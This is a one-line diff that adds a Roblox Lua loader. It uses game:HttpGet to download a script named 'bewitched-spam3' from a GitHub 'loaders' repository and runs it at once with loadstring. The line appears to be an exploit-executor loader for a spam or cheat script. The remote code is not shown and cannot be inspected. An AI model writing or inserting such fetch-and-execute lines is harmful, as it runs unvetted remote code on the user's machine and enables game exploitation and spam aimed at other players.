@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/bewitched-spam3-tzuixw0uhs8y7h.lua"))()
